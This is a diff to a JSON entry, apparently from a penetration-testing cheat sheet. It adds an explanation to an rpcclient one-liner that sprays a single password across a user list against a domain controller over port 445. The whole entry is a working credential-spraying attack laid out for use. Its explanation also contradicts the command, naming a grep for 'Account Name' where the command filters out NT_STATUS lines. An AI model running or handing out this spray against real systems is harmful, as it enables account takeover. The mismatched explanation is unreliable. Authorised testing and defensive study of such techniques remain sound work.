@@ -86,5 +86,6 @@
       "label": "Loop over a userlist",
       "command": "for u in $(cat <userlist>); do rpcclient -U \"$u%<password>\" -c 'getusername;quit' <dc_ip> 2>&1 | grep -v NT_STATUS; done"
     }
-  ]
+  ],
+  "explain": "Sprays a password over MS-RPC as a fallback when Kerberos/SMB spray is blocked:\n  for u in $(cat <userlist>)   loop over each username\n  rpcclient -U \"$u%<password>\"   authenticate as user%password\n  -c 'getusername;quit' <dc_ip>   run a trivial command to test the login\n  | grep 'Account Name'    a successful auth returns this; failures do not\nOne password across the whole list over port 445/TCP."
 }
